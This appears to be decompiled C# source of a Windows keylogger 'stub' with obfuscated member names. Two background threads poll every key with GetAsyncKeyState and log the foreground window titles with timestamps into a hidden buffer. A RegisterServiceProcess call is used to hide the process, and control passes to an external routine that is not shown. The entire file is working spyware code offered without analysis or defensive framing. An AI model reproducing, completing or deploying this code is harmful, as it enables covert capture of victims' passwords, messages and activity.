using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

namespace Stub;

public class A
{
	private static string actv = ACTvv();

	private static string BRK = "";

	private static bool runx = false;

	private static bool runy = false;

	private static Thread thx;

	private static Thread thy;

	[DebuggerNonUserCode]
	public A()
	{
	}

	public static void main_()
	{
		Fransesco.ko();
	}

	public static string ACTvv()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	public static bool CPOM()
	{
		return ((Computer)MyProject.Computer).get_Keyboard().get_CapsLock();
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetAsyncKeyState(long vKey);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	public static string GetL()
	{
		return BRK;
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	[STAThread]
	public static void main()
	{
		runx = true;
		thx = new Thread(timx_run);
		thx.Start();
		runy = true;
		thy = new Thread(timy_run);
		thy.Start();
		Fransesco.ko();
	}

	[DllImport("Kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RegisterServiceProcess(int dwProcessId, int dwType);

	public static void timx_run()
	{
		while (runx)
		{
			Thread.Sleep(100);
			if ((Operators.CompareString(actv, ACTvv(), false) != 0) & (Operators.CompareString(ACTvv(), "", false) != 0))
			{
				actv = ACTvv();
				((ServerComputer)MyProject.Computer).get_Clock().get_LocalTime();
				BRK += "\r\n\u0001" + DateAndTime.get_Now().ToString("yy/MM/dd") + " | " + DateAndTime.get_TimeString() + " - " + ACTvv() + "\u0001\r\n";
			}
		}
	}

	public static void timy_run()
	{
		while (runy)
		{
			int asyncKeyState = GetAsyncKeyState(16L);
			int asyncKeyState2 = GetAsyncKeyState(65L);
			if ((CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (!CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "A";
			}
			if ((!CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "a";
			}
			asyncKeyState2 = GetAsyncKeyState(66L);
			if ((CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (!CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "B";
			}
			if ((!CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "b";
			}
			asyncKeyState2 = GetAsyncKeyState(67L);
			if ((CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (!CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "C";
			}
			if ((!CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "c";
			}
			asyncKeyState2 = GetAsyncKeyState(68L);
			if ((CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (!CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "D";
			}
			if ((!CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "d";
			}
			asyncKeyState2 = GetAsyncKeyState(69L);
			if ((CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (!CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "E";
			}
			if ((!CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "e";
			}
			asyncKeyState2 = GetAsyncKeyState(70L);
			if ((CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (!CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "F";
			}
			if ((!CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "f";
			}
			asyncKeyState2 = GetAsyncKeyState(71L);
			if ((CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (!CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "G";
			}
			if ((!CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "g";
			}
			asyncKeyState2 = GetAsyncKeyState(72L);
			if ((CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (!CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "H";
			}
			if ((!CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "h";
			}
			asyncKeyState2 = GetAsyncKeyState(73L);
			if ((CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (!CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "I";
			}
			if ((!CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "i";
			}
			asyncKeyState2 = GetAsyncKeyState(74L);
			if ((CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (!CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "J";
			}
			if ((!CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "j";
			}
			asyncKeyState2 = GetAsyncKeyState(75L);
			if ((CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (!CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "K";
			}
			if ((!CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "k";
			}
			asyncKeyState2 = GetAsyncKeyState(76L);
			if ((CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (!CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "L";
			}
			if ((!CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "l";
			}
			asyncKeyState2 = GetAsyncKeyState(77L);
			if ((CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (!CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "M";
			}
			if ((!CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "m";
			}
			asyncKeyState2 = GetAsyncKeyState(78L);
			if ((CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (!CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "N";
			}
			if ((!CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "n";
			}
			asyncKeyState2 = GetAsyncKeyState(79L);
			if ((CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (!CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "O";
			}
			if ((!CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "o";
			}
			asyncKeyState2 = GetAsyncKeyState(80L);
			if ((CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (!CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "P";
			}
			if ((!CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "p";
			}
			asyncKeyState2 = GetAsyncKeyState(81L);
			if ((CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (!CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "Q";
			}
			if ((!CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "q";
			}
			asyncKeyState2 = GetAsyncKeyState(82L);
			if ((CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (!CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "R";
			}
			if ((!CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "r";
			}
			asyncKeyState2 = GetAsyncKeyState(83L);
			if ((CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (!CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "S";
			}
			if ((!CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "s";
			}
			asyncKeyState2 = GetAsyncKeyState(84L);
			if ((CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (!CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "T";
			}
			if ((!CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "t";
			}
			asyncKeyState2 = GetAsyncKeyState(85L);
			if ((CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (!CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "U";
			}
			if ((!CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "u";
			}
			asyncKeyState2 = GetAsyncKeyState(86L);
			if ((CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (!CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "V";
			}
			if ((!CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "v";
			}
			asyncKeyState2 = GetAsyncKeyState(87L);
			if ((CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (!CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "W";
			}
			if ((!CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "w";
			}
			asyncKeyState2 = GetAsyncKeyState(88L);
			if ((CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (!CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "X";
			}
			if ((!CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "x";
			}
			asyncKeyState2 = GetAsyncKeyState(89L);
			if ((CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (!CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "Y";
			}
			if ((!CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "y";
			}
			asyncKeyState2 = GetAsyncKeyState(90L);
			if ((CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (!CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "Z";
			}
			if ((!CPOM() && asyncKeyState == 0 && (asyncKeyState2 & 1) == 1) | (CPOM() && asyncKeyState != 0 && (asyncKeyState2 & 1) == 1))
			{
				BRK += "z";
			}
			asyncKeyState2 = GetAsyncKeyState(49L);
			if (asyncKeyState == 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "1";
			}
			if (asyncKeyState != 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "!";
			}
			asyncKeyState2 = GetAsyncKeyState(50L);
			if (asyncKeyState == 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "2";
			}
			if (asyncKeyState != 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "@";
			}
			asyncKeyState2 = GetAsyncKeyState(51L);
			if (asyncKeyState == 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "3";
			}
			if (asyncKeyState != 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "#";
			}
			asyncKeyState2 = GetAsyncKeyState(52L);
			if (asyncKeyState == 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "4";
			}
			if (asyncKeyState != 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "$";
			}
			asyncKeyState2 = GetAsyncKeyState(53L);
			if (asyncKeyState == 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "5";
			}
			if (asyncKeyState != 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "%";
			}
			asyncKeyState2 = GetAsyncKeyState(54L);
			if (asyncKeyState == 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "6";
			}
			if (asyncKeyState != 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "^";
			}
			asyncKeyState2 = GetAsyncKeyState(55L);
			if (asyncKeyState == 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "7";
			}
			if (asyncKeyState != 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "&";
			}
			asyncKeyState2 = GetAsyncKeyState(56L);
			if (asyncKeyState == 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "8";
			}
			if (asyncKeyState != 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "*";
			}
			asyncKeyState2 = GetAsyncKeyState(57L);
			if (asyncKeyState == 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "9";
			}
			if (asyncKeyState != 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "(";
			}
			asyncKeyState2 = GetAsyncKeyState(48L);
			if (asyncKeyState == 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "0";
			}
			if (asyncKeyState != 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += ")";
			}
			if ((GetAsyncKeyState(8L) & 1) == 1)
			{
				BRK += "[Back]";
			}
			if ((GetAsyncKeyState(9L) & 1) == 1)
			{
				BRK += "[tab]";
			}
			if ((GetAsyncKeyState(13L) & 1) == 1)
			{
				BRK += "\r\n";
			}
			if ((GetAsyncKeyState(16L) & 1) == 1)
			{
				BRK += "[shift]";
			}
			if ((GetAsyncKeyState(17L) & 1) == 1)
			{
				BRK += "[ctrl]";
			}
			if ((GetAsyncKeyState(18L) & 1) == 1)
			{
				BRK += "[alt]";
			}
			if ((GetAsyncKeyState(19L) & 1) == 1)
			{
				BRK += "[pause]";
			}
			if ((GetAsyncKeyState(27L) & 1) == 1)
			{
				BRK += "[esc]";
			}
			if ((GetAsyncKeyState(32L) & 1) == 1)
			{
				BRK += " ";
			}
			if ((GetAsyncKeyState(35L) & 1) == 1)
			{
				BRK += "[end]";
			}
			if ((GetAsyncKeyState(36L) & 1) == 1)
			{
				BRK += "[home]";
			}
			if ((GetAsyncKeyState(37L) & 1) == 1)
			{
				BRK += "[left]";
			}
			if ((GetAsyncKeyState(39L) & 1) == 1)
			{
				BRK += "[right]";
			}
			if ((GetAsyncKeyState(38L) & 1) == 1)
			{
				BRK += "[up]";
			}
			if ((GetAsyncKeyState(40L) & 1) == 1)
			{
				BRK += "[down]";
			}
			if ((GetAsyncKeyState(45L) & 1) == 1)
			{
				BRK += "[insert]";
			}
			if ((GetAsyncKeyState(46L) & 1) == 1)
			{
				BRK += "[Delete]";
			}
			asyncKeyState2 = GetAsyncKeyState(186L);
			if (asyncKeyState == 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += ";";
			}
			if (asyncKeyState != 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += ":";
			}
			asyncKeyState2 = GetAsyncKeyState(187L);
			if (asyncKeyState == 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "=";
			}
			if (asyncKeyState != 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "+";
			}
			asyncKeyState2 = GetAsyncKeyState(188L);
			if (asyncKeyState == 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += ",";
			}
			if (asyncKeyState != 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "<";
			}
			asyncKeyState2 = GetAsyncKeyState(189L);
			if (asyncKeyState == 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "-";
			}
			if (asyncKeyState != 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "_";
			}
			asyncKeyState2 = GetAsyncKeyState(190L);
			if (asyncKeyState == 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += ".";
			}
			if (asyncKeyState != 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += ">";
			}
			asyncKeyState2 = GetAsyncKeyState(191L);
			if (asyncKeyState == 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "/";
			}
			if (asyncKeyState != 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "?";
			}
			asyncKeyState2 = GetAsyncKeyState(192L);
			if (asyncKeyState == 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "`";
			}
			if (asyncKeyState != 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "~";
			}
			asyncKeyState2 = GetAsyncKeyState(219L);
			if (asyncKeyState == 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "";
			}
			if (asyncKeyState != 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "";
			}
			asyncKeyState2 = GetAsyncKeyState(220L);
			if (asyncKeyState == 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "\\";
			}
			if (asyncKeyState != 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "|";
			}
			asyncKeyState2 = GetAsyncKeyState(221L);
			if (asyncKeyState == 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "";
			}
			if (asyncKeyState != 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "";
			}
			asyncKeyState2 = GetAsyncKeyState(222L);
			if (asyncKeyState == 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "'";
			}
			if (asyncKeyState != 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "\"";
			}
			if ((GetAsyncKeyState(106L) & 1) == 1)
			{
				BRK += "*";
			}
			if ((GetAsyncKeyState(111L) & 1) == 1)
			{
				BRK += "/";
			}
			if ((GetAsyncKeyState(107L) & 1) == 1)
			{
				BRK += "+";
			}
			if ((GetAsyncKeyState(109L) & 1) == 1)
			{
				BRK += "-";
			}
			if ((GetAsyncKeyState(110L) & 1) == 1)
			{
				BRK += ".";
			}
			if ((GetAsyncKeyState(112L) & 1) == 1)
			{
				BRK += "[F1]";
			}
			if ((GetAsyncKeyState(113L) & 1) == 1)
			{
				BRK += "[F2]";
			}
			if ((GetAsyncKeyState(114L) & 1) == 1)
			{
				BRK += "[F3]";
			}
			if ((GetAsyncKeyState(115L) & 1) == 1)
			{
				BRK += "[F4]";
			}
			if ((GetAsyncKeyState(116L) & 1) == 1)
			{
				BRK += "[F5]";
			}
			if ((GetAsyncKeyState(117L) & 1) == 1)
			{
				BRK += "[F6]";
			}
			if ((GetAsyncKeyState(118L) & 1) == 1)
			{
				BRK += "[F7]";
			}
			if ((GetAsyncKeyState(119L) & 1) == 1)
			{
				BRK += "[F8]";
			}
			if ((GetAsyncKeyState(120L) & 1) == 1)
			{
				BRK += "[F9]";
			}
			if ((GetAsyncKeyState(121L) & 1) == 1)
			{
				BRK += "[F10]";
			}
			if ((GetAsyncKeyState(122L) & 1) == 1)
			{
				BRK += "[F11]";
			}
			asyncKeyState2 = GetAsyncKeyState(123L);
			if (asyncKeyState == 0 && (asyncKeyState2 & 1) == 1)
			{
				BRK += "[F12]";
			}
			if (asyncKeyState != 0 && (asyncKeyState2 & 1) == 1)
			{
				RegisterServiceProcess(0, 0);
			}
			if ((GetAsyncKeyState(144L) & 1) == 1)
			{
				BRK += "[NumLock]";
			}
			if ((GetAsyncKeyState(145L) & 1) == 1)
			{
				BRK += "[ScrollLock]";
			}
			if ((GetAsyncKeyState(42L) & 1) == 1)
			{
				BRK += "[PrintScreen]";
			}
			if ((GetAsyncKeyState(33L) & 1) == 1)
			{
				BRK += "[PageUp]";
			}
			if ((GetAsyncKeyState(34L) & 1) == 1)
			{
				BRK += "[Pagedown]";
			}
			if ((GetAsyncKeyState(97L) & 1) == 1)
			{
				BRK += "1";
			}
			if ((GetAsyncKeyState(98L) & 1) == 1)
			{
				BRK += "2";
			}
			if ((GetAsyncKeyState(99L) & 1) == 1)
			{
				BRK += "3";
			}
			if ((GetAsyncKeyState(100L) & 1) == 1)
			{
				BRK += "4";
			}
			if ((GetAsyncKeyState(101L) & 1) == 1)
			{
				BRK += "5";
			}
			if ((GetAsyncKeyState(102L) & 1) == 1)
			{
				BRK += "6";
			}
			if ((GetAsyncKeyState(103L) & 1) == 1)
			{
				BRK += "7";
			}
			if ((GetAsyncKeyState(104L) & 1) == 1)
			{
				BRK += "8";
			}
			if ((GetAsyncKeyState(105L) & 1) == 1)
			{
				BRK += "9";
			}
			if ((GetAsyncKeyState(96L) & 1) == 1)
			{
				BRK += "0";
			}
			if ((GetAsyncKeyState(17L) & 1) == 1)
			{
				BRK += "[Ctrl]";
			}
		}
	}
}
